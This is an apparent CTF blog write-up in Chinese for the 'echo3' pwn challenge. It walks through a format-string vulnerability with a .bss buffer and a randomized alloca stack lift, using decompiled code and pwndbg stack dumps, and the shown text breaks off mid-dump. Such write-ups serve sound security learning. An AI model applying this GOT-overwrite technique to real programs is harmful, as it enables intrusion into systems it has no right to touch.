@@ -1,0 +1,805 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="writeup,pwn,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="防护机制： 123456[*] &amp;apos;/home/zs0zrc/pwn/Scoreboard/echo3/echo3&amp;apos;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048">
+<meta name="keywords" content="writeup,pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="echo3 writeup">
+<meta property="og:url" content="http://yoursite.com/2018/10/03/2018-10-2-echo3-writeup/index.html">
+<meta property="og:site_name" content="zs0zrc">
+<meta property="og:description" content="防护机制： 123456[*] &amp;apos;/home/zs0zrc/pwn/Scoreboard/echo3/echo3&amp;apos;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-01-02T08:12:54.119Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="echo3 writeup">
+<meta name="twitter:description" content="防护机制： 123456[*] &amp;apos;/home/zs0zrc/pwn/Scoreboard/echo3/echo3&amp;apos;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/10/03/2018-10-2-echo3-writeup/">
+
+
+
+
+
+  <title>echo3 writeup | zs0zrc</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">zs0zrc</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/03/2018-10-2-echo3-writeup/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="zs0zrc">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zs0zrc">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">echo3 writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-03T11:11:05+08:00">
+                2018-10-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/hackme-inndy-writeup/" itemprop="url" rel="index">
+                    <span itemprop="name">hackme.inndy_writeup</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/10/03/2018-10-2-echo3-writeup/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2018/10/03/2018-10-2-echo3-writeup/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>防护机制：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/zs0zrc/pwn/Scoreboard/echo3/echo3&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<p>这道题是echo 和echo2的升级版，也是一个格式化字符串漏洞，不过它将printf的格式化字符串放到了bss段上去了。一般来说格式化字符串在bss段的话，就要在栈上构造跳板，通过跳板实现任意地址写。具体点就是，找到栈上指向栈的指针，向指针写入got表地址，然后再通过这实现任意地址写</p>
+<p>main函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// esp</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [esp+14h] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [esp+18h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+24h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+28h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  fd = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"urandom error"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  read(fd, &amp;buf, <span class="number">8u</span>);</span><br><span class="line">  read(fd, &amp;magic, <span class="number">4u</span>);</span><br><span class="line">  close(fd);</span><br><span class="line">  v3 = alloca(<span class="number">16</span> * (((buf &amp; <span class="number">0x3039</span>u) + <span class="number">30</span>) / <span class="number">0x10</span>));<span class="comment">//它在这里做了一个抬栈的操作</span></span><br><span class="line">  hardfmt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里打开了/dev/urandom文件，读取了8个字节到buf中，读取了4个字节到magic中。并且它利用alloca函数，做了一个抬栈的操作，alloca函数的作用是分配内存，不过是向栈申请内存。在这里被用来抬栈，而且每次都是随机的，所以要先爆破一下，泄露出地址后才进行下一步</p>
+<p>stack 的情况</p>
+<p>随机抬高后的栈大部分就像这样子</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span> <span class="number">100</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ esp  <span class="number">0xffffaf1c</span> —▸ <span class="number">0x804864b</span> (hardfmt+<span class="number">133</span>) ◂— add    esp, <span class="number">0x10</span></span><br><span class="line">01:0004│      0xffffaf20 —▸ 0x804a080 (buff) ◂— 'aaaa\n'</span><br><span class="line">... ↓</span><br><span class="line"><span class="number">03</span>:<span class="number">000</span>c│      <span class="number">0xffffaf28</span> ◂— <span class="number">0x1000</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0010</span>│      <span class="number">0xffffaf2c</span> ◂— <span class="number">0x0</span></span><br><span class="line">05:0014│      0xffffaf30 ◂— 'n,D*'</span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>│      <span class="number">0xffffaf34</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">0</span>c:<span class="number">0030</span>│      <span class="number">0xffffaf4c</span> —▸ <span class="number">0x80485d2</span> (hardfmt+<span class="number">12</span>) ◂— add    ebx, <span class="number">0x1a2e</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0034</span>│      <span class="number">0xffffaf50</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line">0f:003c│      0xffffaf58 —▸ 0xffffaf30 ◂— 'n,D*'</span><br><span class="line"><span class="number">10</span>:<span class="number">0040</span>│      <span class="number">0xffffaf5c</span> ◂— <span class="number">0x519ab900</span></span><br><span class="line"><span class="number">11</span>:<span class="number">0044</span>│      <span class="number">0xffffaf60</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0048</span>│      <span class="number">0xffffaf64</span> —▸ <span class="number">0x804a000</span> (_GLOBAL_OFFSET_TABLE_) —▸ <span class="number">0x8049f10</span> (_DYNAMIC) ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">13</span>:<span class="number">004</span>c│ ebp  <span class="number">0xffffaf68</span> —▸ <span class="number">0xffffcfc8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">14</span>:<span class="number">0050</span>│      <span class="number">0xffffaf6c</span> —▸ <span class="number">0x804877b</span> (main+<span class="number">236</span>) ◂— mov    eax, <span class="number">0</span></span><br><span class="line"><span class="number">15</span>:<span class="number">0054</span>│      <span class="number">0xffffaf70</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br></pre></td></tr></table></figure>
+<p>这是我用到的栈情况,可以通过gdb调试，在alloca函数上下个断点，然后通过 set $eax=0x20来获得</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span> <span class="number">100</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ esp  <span class="number">0xffbf8a6c</span> —▸ <span class="number">0x804864b</span> (hardfmt+<span class="number">133</span>) ◂— add    esp, <span class="number">0x10</span></span><br><span class="line">01:0004│      0xffbf8a70 —▸ 0x804a080 (buff) ◂— 0x35353325 ('%355')</span><br><span class="line">... ↓</span><br><span class="line"><span class="number">03</span>:<span class="number">000</span>c│      <span class="number">0xffbf8a78</span> ◂— <span class="number">0x1000</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0010</span>│      <span class="number">0xffbf8a7c</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0014</span>│      <span class="number">0xffbf8a80</span> ◂— <span class="number">0x6c018c2e</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>│      <span class="number">0xffbf8a84</span> —▸ <span class="number">0x804829c</span> ◂— add    byte ptr [ecx + ebp*<span class="number">2</span> + <span class="number">0x62</span>], ch</span><br><span class="line"><span class="number">07</span>:<span class="number">001</span>c│      <span class="number">0xffbf8a88</span> —▸ <span class="number">0xf77ec918</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0020</span>│      <span class="number">0xffbf8a8c</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0024</span>│      <span class="number">0xffbf8a90</span> —▸ <span class="number">0xffbf8ace</span> ◂— <span class="number">0x30804</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0028</span>│      <span class="number">0xffbf8a94</span> —▸ <span class="number">0xf75fe018</span> ◂— stosd  dword ptr es:[edi], eax</span><br><span class="line"><span class="number">0b</span>:<span class="number">002</span>c│      <span class="number">0xffbf8a98</span> —▸ <span class="number">0xf765321b</span> (setbuffer+<span class="number">11</span>) ◂— add    ebx, <span class="number">0x151de5</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0030</span>│      <span class="number">0xffbf8a9c</span> —▸ <span class="number">0x80485d2</span> (hardfmt+<span class="number">12</span>) ◂— add    ebx, <span class="number">0x1a2e</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0034</span>│      <span class="number">0xffbf8aa0</span> —▸ <span class="number">0xf77d67eb</span> (_dl_fixup+<span class="number">11</span>) ◂— add    esi, <span class="number">0x15815</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0038</span>│      <span class="number">0xffbf8aa4</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">003</span>c│      <span class="number">0xffbf8aa8</span> —▸ <span class="number">0xffbf8a80</span> ◂— <span class="number">0x6c018c2e</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0040</span>│      <span class="number">0xffbf8aac</span> ◂— <span class="number">0x3b9d0100</span></span><br><span class="line"><span class="number">11</span>:<span class="number">0044</span>│      <span class="number">0xffbf8ab0</span> —▸ <span class="number">0xffbf8b18</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0048</span>│      <span class="number">0xffbf8ab4</span> —▸ <span class="number">0x804a000</span> (_GLOBAL_OFFSET_TABLE_) —▸ <span class="number">0x8049f10</span> (_DYNAMIC) ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">13</span>:<span class="number">004</span>c│ ebp  <span class="number">0xffbf8ab8</span> —▸ <span class="number">0xffbf8b18</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">14</span>:<span class="number">0050</span>│      <span class="number">0xffbf8abc</span> —▸ <span class="number">0x804877b</span> (main+<span class="number">236</span>) ◂— mov    eax, <span class="number">0</span></span><br><span class="line"><span class="number">15</span>:<span class="number">0054</span>│      <span class="number">0xffbf8ac0</span> —▸ <span class="number">0x804a000</span> (_GLOBAL_OFFSET_TABLE_) —▸ <span class="number">0x8049f10</span> (_DYNAMIC) ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">16</span>:<span class="number">0058</span>│      <span class="number">0xffbf8ac4</span> —▸ <span class="number">0x804a060</span> (magic) ◂— <span class="number">0x6c018c2e</span>	<span class="comment">//偏移为21</span></span><br><span class="line"><span class="number">17</span>:<span class="number">005</span>c│      <span class="number">0xffbf8ac8</span> —▸ <span class="number">0xf76c92ac</span> (__close_nocancel+<span class="number">18</span>) ◂— mov    ebx, edx</span><br><span class="line"><span class="number">18</span>:<span class="number">0060</span>│      <span class="number">0xffbf8acc</span> —▸ <span class="number">0x804874a</span> (main+<span class="number">187</span>) ◂— add    esp, <span class="number">0x10</span></span><br><span class="line"><span class="number">19</span>:<span class="number">0064</span>│      <span class="number">0xffbf8ad0</span> ◂— <span class="number">0x3</span></span><br><span class="line"><span class="number">1</span>a:<span class="number">0068</span>│      <span class="number">0xffbf8ad4</span> —▸ <span class="number">0x804a060</span> (magic) ◂— <span class="number">0x6c018c2e</span></span><br><span class="line"><span class="number">1b</span>:<span class="number">006</span>c│      <span class="number">0xffbf8ad8</span> ◂— <span class="number">0x4</span></span><br><span class="line"><span class="number">1</span>c:<span class="number">0070</span>│      <span class="number">0xffbf8adc</span> —▸ <span class="number">0x80486a6</span> (main+<span class="number">23</span>) ◂— add    ebx, <span class="number">0x195a</span></span><br><span class="line"><span class="number">1</span>d:<span class="number">0074</span>│      <span class="number">0xffbf8ae0</span> ◂— <span class="number">0x8000</span></span><br><span class="line"><span class="number">1</span>e:<span class="number">0078</span>│      <span class="number">0xffbf8ae4</span> —▸ <span class="number">0xf77a5000</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="number">0x1b1db0</span></span><br><span class="line">1f:007c│      0xffbf8ae8 —▸ 0xffbf8bcc —▸ 0xffbfa2ba ◂— 0x515f5451 ('QT_Q')	//这是选择的跳板</span><br><span class="line">20:0080│      0xffbf8aec —▸ 0xffbf8bc4 —▸ 0xffbfa2b2 ◂— './echo3'	//</span><br><span class="line"><span class="number">21</span>:<span class="number">0084</span>│      <span class="number">0xffbf8af0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">22</span>:<span class="number">0088</span>│      <span class="number">0xffbf8af4</span> ◂— <span class="number">0x0</span></span><br><span class="line">23:008c│      0xffbf8af8 —▸ 0xffbf8bcc —▸ 0xffbfa2ba ◂— 0x515f5451 ('QT_Q')</span><br><span class="line"><span class="number">24</span>:<span class="number">0090</span>│      <span class="number">0xffbf8afc</span> ◂— <span class="number">0x3</span></span><br><span class="line"><span class="number">25</span>:<span class="number">0094</span>│      <span class="number">0xffbf8b00</span> ◂— <span class="number">0x6771084c</span></span><br><span class="line"><span class="number">26</span>:<span class="number">0098</span>│      <span class="number">0xffbf8b04</span> ◂— <span class="number">0xedf68435</span></span><br><span class="line">27:009c│      0xffbf8b08 —▸ 0xffbf8bcc —▸ 0xffbfa2ba ◂— 0x515f5451 ('QT_Q')</span><br><span class="line"><span class="number">28</span>:<span class="number">00</span>a0│      <span class="number">0xffbf8b0c</span> ◂— <span class="number">0x3b9d0100</span></span><br><span class="line"><span class="number">29</span>:<span class="number">00</span>a4│      <span class="number">0xffbf8b10</span> —▸ <span class="number">0xffbf8b30</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">2</span>a:<span class="number">00</span>a8│      <span class="number">0xffbf8b14</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">2</span>c:<span class="number">00b</span>0│      <span class="number">0xffbf8b1c</span> —▸ <span class="number">0xf760b637</span> (__libc_start_main+<span class="number">247</span>) ◂— add    esp, <span class="number">0x10</span></span><br><span class="line"><span class="number">2</span>d:<span class="number">00b</span>4│      <span class="number">0xffbf8b20</span> —▸ <span class="number">0xf77a5000</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="number">0x1b1db0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">2f</span>:<span class="number">00b</span>c│      <span class="number">0xffbf8b28</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">30</span>:<span class="number">00</span>c0│      <span class="number">0xffbf8b2c</span> —▸ <span class="number">0xf760b637</span> (__libc_start_main+<span class="number">247</span>) ◂— add    esp, <span class="number">0x10</span></span><br><span class="line"><span class="number">31</span>:<span class="number">00</span>c4│      <span class="number">0xffbf8b30</span> ◂— <span class="number">0x1</span></span><br><span class="line">32:00c8│      0xffbf8b34 —▸ 0xffbf8bc4 —▸ 0xffbfa2b2 ◂— './echo3'</span><br><span class="line">33:00cc│      0xffbf8b38 —▸ 0xffbf8bcc —▸ 0xffbfa2ba ◂— 0x515f5451 ('QT_Q')</span><br><span class="line"><span class="number">34</span>:<span class="number">00</span>d0│      <span class="number">0xffbf8b3c</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">37</span>:<span class="number">00</span>dc│      <span class="number">0xffbf8b48</span> —▸ <span class="number">0xf77a5000</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="number">0x1b1db0</span></span><br><span class="line"><span class="number">38</span>:<span class="number">00e0</span>│      <span class="number">0xffbf8b4c</span> —▸ <span class="number">0xf77ecc04</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">39</span>:<span class="number">00e4</span>│      <span class="number">0xffbf8b50</span> —▸ <span class="number">0xf77ec000</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="number">0x23f3c</span></span><br><span class="line"><span class="number">3</span>a:<span class="number">00e8</span>│      <span class="number">0xffbf8b54</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">3b</span>:<span class="number">00</span>ec│      <span class="number">0xffbf8b58</span> —▸ <span class="number">0xf77a5000</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="number">0x1b1db0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">3</span>d:<span class="number">00f</span>4│      <span class="number">0xffbf8b60</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">3</span>e:<span class="number">00f</span>8│      <span class="number">0xffbf8b64</span> ◂— <span class="number">0xc11ec013</span></span><br><span class="line"><span class="number">3f</span>:<span class="number">00f</span>c│      <span class="number">0xffbf8b68</span> ◂— <span class="number">0x7f634e02</span></span><br><span class="line"><span class="number">40</span>:<span class="number">0100</span>│      <span class="number">0xffbf8b6c</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">43</span>:<span class="number">010</span>c│      <span class="number">0xffbf8b78</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">44</span>:<span class="number">0110</span>│      <span class="number">0xffbf8b7c</span> —▸ <span class="number">0x80484b0</span> (_start) ◂— xor    ebp, ebp</span><br><span class="line"><span class="number">45</span>:<span class="number">0114</span>│      <span class="number">0xffbf8b80</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">46</span>:<span class="number">0118</span>│      <span class="number">0xffbf8b84</span> —▸ <span class="number">0xf77dd010</span> (_dl_runtime_resolve+<span class="number">16</span>) ◂— pop    edx</span><br><span class="line"><span class="number">47</span>:<span class="number">011</span>c│      <span class="number">0xffbf8b88</span> —▸ <span class="number">0xf77d7880</span> (_dl_fini) ◂— push   ebp</span><br><span class="line"><span class="number">48</span>:<span class="number">0120</span>│      <span class="number">0xffbf8b8c</span> —▸ <span class="number">0x804a000</span> (_GLOBAL_OFFSET_TABLE_) —▸ <span class="number">0x8049f10</span> (_DYNAMIC) ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">49</span>:<span class="number">0124</span>│      <span class="number">0xffbf8b90</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">4</span>a:<span class="number">0128</span>│      <span class="number">0xffbf8b94</span> —▸ <span class="number">0x80484b0</span> (_start) ◂— xor    ebp, ebp</span><br><span class="line"><span class="number">4b</span>:<span class="number">012</span>c│      <span class="number">0xffbf8b98</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">4</span>c:<span class="number">0130</span>│      <span class="number">0xffbf8b9c</span> —▸ <span class="number">0x80484e2</span> (_start+<span class="number">50</span>) ◂— hlt    </span><br><span class="line"><span class="number">4</span>d:<span class="number">0134</span>│      <span class="number">0xffbf8ba0</span> —▸ <span class="number">0x804868f</span> (main) ◂— lea    ecx, [esp + <span class="number">4</span>]</span><br><span class="line"><span class="number">4</span>e:<span class="number">0138</span>│      <span class="number">0xffbf8ba4</span> ◂— <span class="number">0x1</span></span><br><span class="line">4f:013c│      0xffbf8ba8 —▸ 0xffbf8bc4 —▸ 0xffbfa2b2 ◂— './echo3'</span><br><span class="line"><span class="number">50</span>:<span class="number">0140</span>│      <span class="number">0xffbf8bac</span> —▸ <span class="number">0x80487a0</span> (__libc_csu_init) ◂— push   ebp</span><br><span class="line"><span class="number">51</span>:<span 